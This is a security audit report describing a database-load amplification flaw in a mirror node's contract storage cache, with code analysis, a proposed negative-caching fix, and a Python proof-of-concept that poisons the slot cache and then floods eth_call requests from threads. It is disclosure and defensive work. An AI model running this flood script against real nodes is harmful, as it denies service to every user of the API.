Audit Report

## Title
Unbounded Batch DB Query Amplification via Slot Cache Poisoning in `findStorageBatch()`

## Summary
An unauthenticated attacker can permanently register up to 1500 non-existent storage slot keys into the per-contract `slotsPerContract` cache. Because `findStorageBatch()` unconditionally queries the database with **all** currently cached slot keys on every invocation, and because non-existent slots are never written to `contractStateCache`, every subsequent request for any of those slots re-issues the full 1500-slot batch query. This produces a sustained up-to-1500× amplification of database load with no authentication required.

## Finding Description

**Exact code path:**

`ContractStateServiceImpl.findStorage()` ( [1](#0-0) ) checks `contractStateCache` first. The guard condition at line 65 is:

```java
if (cachedValue != null && cachedValue != EMPTY_VALUE) {
    return Optional.of(cachedValue);
}
```

For any slot not present in `contractStateCache`, `cachedValue` is `null`, so the condition is false and execution falls through to `findStorageBatch()`.

Inside `findStorageBatch()` ( [2](#0-1) ):

- **Line 90**: `contractSlotsCache.putIfAbsent(wrappedKey, EMPTY_VALUE)` — registers the requested slot key into the per-contract slot cache.
- **Line 91**: `contractSlotsCache.getNativeCache().asMap().keySet()` — retrieves **all** currently cached slot keys for this contract.
- **Line 103**: `contractStateRepository.findStorageBatch(contractId.getId(), cachedSlots)` — issues a single DB query with **every** cached slot key.
- **Lines 106–113**: Only slots that actually exist in the DB are written to `contractStateCache`. Non-existent slots receive no entry. [3](#0-2) 

**Root cause — failed assumption:** The design assumes that after the first batch query, all queried slots are cached in `contractStateCache` (TTL=2s), so subsequent requests hit the cache and bypass `findStorageBatch()`. This assumption fails for non-existent slots: `findStorageBatch()` only writes to `contractStateCache` for slots that return a DB row. A slot key that returns no row is never written to `contractStateCache`. Therefore, every subsequent request for a non-existent slot re-enters `findStorageBatch()` and re-issues the full batch query with all cached keys.

**Cache configuration confirming the bounds:**

- `slotsPerContract`: `expireAfterAccess=5m,maximumSize=1500` [4](#0-3) 
- `contractState`: `expireAfterWrite=2s,maximumSize=25000` [5](#0-4) 

**The DB query being amplified:**

```sql
SELECT slot, value FROM contract_state
WHERE contract_id = :contractId
AND slot IN (:slots)
``` [6](#0-5) 

**Exploit flow:**

1. Attacker sends ~1500 `eth_call` requests to any existing contract, each reading a different 32-byte slot key that does not exist in `contract_state`. Each request adds one new key to the per-contract `slotsPerContract` cache (TTL=5m, max=1500).
2. Cache is now full: 1500 non-existent slot keys are registered.
3. Attacker continues sending `eth_call` requests at the rate limit (500 RPS). Each request for any of the 1500 cached slots:
   - Misses `contractStateCache` (never populated for non-existent slots)
   - Enters `findStorageBatch()`
   - Issues a DB query with all 1500 cached slot keys
4. DB receives 500 × 1500 = **750,000 slot lookups per second** instead of the baseline 500.
5. The `slotsPerContract` cache TTL is 5 minutes (`expireAfterAccess=5m`), so the amplified state persists as long as the attacker keeps accessing the slots.

**Why existing mitigations are insufficient:**

- `contractStateCache` (TTL=2s): Only caches slots that exist in the DB. Non-existent slots are never cached here, so the check at lines 63–67 always falls through to `findStorageBatch()`. [7](#0-6) 
- Rate limiter (500 RPS / gas throttle): Throttles request count, not DB query complexity. The 1500× amplification multiplier is invisible to the throttle. [8](#0-7) 
- `statementTimeout` (3000ms): A batch query with 1500 non-existent slots returns an empty result set quickly (index scan), completing well within the timeout while still consuming DB I/O and connection pool resources. [9](#0-8) 
- `enableBatchContractSlotCaching` flag (default=`true`): A kill-switch but enabled by default and not documented as a security control. [10](#0-9) 

## Impact Explanation

The DB receives up to 1500× more slot-lookup work per second than the rate limiter is designed to allow. At 500 RPS with a full 1500-slot cache, the DB processes 750,000 slot lookups/second instead of 500. This can saturate DB CPU, I/O, and connection pool resources, degrading or denying service for all users of the mirror node Web3 API. The `slotsPerContract` cache persists for 5 minutes per access, so the attacker only needs to maintain a low-rate keep-alive to sustain the amplified state indefinitely.

## Likelihood Explanation

The attack requires no credentials, no on-chain funds, and no special knowledge beyond the address of any contract deployed on the network. The attacker needs only an HTTP client capable of sending JSON-RPC `eth_call` requests. The slot keys can be arbitrary 32-byte values; they do not need to correspond to real storage. The attack is fully repeatable and can be automated with a trivial script.

## Recommendation

**Primary fix — cache negative (non-existent) slot lookups in `contractStateCache`:**

After `findStorageBatch()` completes, if the requested key was not found in the DB results, write a sentinel value (e.g., `EMPTY_VALUE`) into `contractStateCache` for that key. Then update the guard in `findStorage()` to treat a cached `EMPTY_VALUE` as a definitive "not found" result (returning `Optional.empty()`) rather than falling through to `findStorageBatch()`.

Concretely, in `findStorageBatch()` after the result loop (after line 114), add:

```java
if (cachedValue == null && !isKeyEvictedFromCache) {
    contractStateCache.put(generateCacheKey(contractId, key), EMPTY_VALUE);
}
```

And update the guard in `findStorage()` (line 65) to:

```java
if (cachedValue != null) {
    return cachedValue == EMPTY_VALUE ? Optional.empty() : Optional.of(cachedValue);
}
```

This ensures non-existent slots are cached for the 2-second TTL, preventing repeated `findStorageBatch()` calls and eliminating the amplification vector.

**Secondary mitigations:**
- Consider adding a per-IP or per-contract rate limit on the number of distinct slot keys that can be registered in `slotsPerContract` within a time window.
- Document `enableBatchContractSlotCaching=false` as a security-relevant kill-switch in operational runbooks.

## Proof of Concept

```python
import requests, os

TARGET = "http://<mirror-node>/api/v1/contracts/call"
CONTRACT = "0x<any_deployed_contract>"

# Phase 1: Poison the slotsPerContract cache with 1500 non-existent slot keys
for i in range(1500):
    slot = hex(i).replace("0x", "").zfill(64)
    requests.post(TARGET, json={
        "jsonrpc": "2.0", "method": "eth_call",
        "params": [{"to": CONTRACT, "data": "0x" + slot}, "latest"],
        "id": i
    })

# Phase 2: Sustain amplified DB load — each request triggers a 1500-slot batch query
import threading
def flood():
    while True:
        slot = "00" * 32  # any of the 1500 cached non-existent slots
        requests.post(TARGET, json={
            "jsonrpc": "2.0", "method": "eth_call",
            "params": [{"to": CONTRACT, "data": "0x" + slot}, "latest"],
            "id": 1
        })

for _ in range(10):
    threading.Thread(target=flood, daemon=True).start()
```

Each request in Phase 2 causes `findStorageBatch()` to issue a `SELECT ... WHERE slot IN (1500 keys)` query, producing a sustained 1500× DB amplification at the configured rate limit.

    private Optional<byte[]> findStorageBatch(final EntityId contractId, final byte[] key) {
        final var contractSlotsCache = ((CaffeineCache) this.contractSlotsCache.get(
                contractId, () -> cacheManagerSlotsPerContract.getCache(contractId.toString())));
        final var wrappedKey = ByteBuffer.wrap(key);
        // Cached slot keys for contract, whose slot values are not present in the contractStateCache
        contractSlotsCache.putIfAbsent(wrappedKey, EMPTY_VALUE);
        final var cachedSlotKeys = contractSlotsCache.getNativeCache().asMap().keySet();

        final var cachedSlots = new ArrayList<byte[]>(cachedSlotKeys.size());
        boolean isKeyEvictedFromCache = true;

        for (var slot : cachedSlotKeys) {
            cachedSlots.add(((ByteBuffer) slot).array());
            if (wrappedKey.equals(slot)) {
                isKeyEvictedFromCache = false;
            }
        }

        final var contractSlotValues = contractStateRepository.findStorageBatch(contractId.getId(), cachedSlots);
        byte[] cachedValue = null;

        for (final var contractSlotValue : contractSlotValues) {
            final byte[] slotKey = contractSlotValue.getSlot();
            final byte[] slotValue = contractSlotValue.getValue();
            contractStateCache.put(generateCacheKey(contractId, slotKey), slotValue);

            if (Arrays.equals(slotKey, key)) {
                cachedValue = slotValue;
            }
        }

        // If the cache key was evicted and hasn't been requested since, the cached value will be null.
        // In that case, fall back to the original query.
        if (isKeyEvictedFromCache) {
            return contractStateRepository.findStorage(contractId.getId(), key);
        }
        return Optional.ofNullable(cachedValue);
    }
